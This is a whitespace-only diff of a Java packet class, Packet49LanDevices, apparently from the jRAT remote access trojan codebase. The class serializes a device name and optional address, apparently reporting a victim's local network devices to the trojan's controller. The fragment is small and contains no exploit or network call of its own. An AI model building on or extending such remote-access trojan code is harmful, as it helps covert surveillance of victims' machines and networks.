@@ -4,12 +4,11 @@ import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet49LanDevices extends AbstractOutgoingPacket {
-	
+
 	private String device;
 	private String address;
-	
+
 	public Packet49LanDevices(String device, String address) {
 		this.device = device;
 		this.address = address;
@@ -18,7 +17,7 @@ public class Packet49LanDevices extends AbstractOutgoingPacket {
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
 		sw.writeLine(this.device);
-		
+
 		if (this.address != null) {
 			sw.writeLine(this.address);
 		}
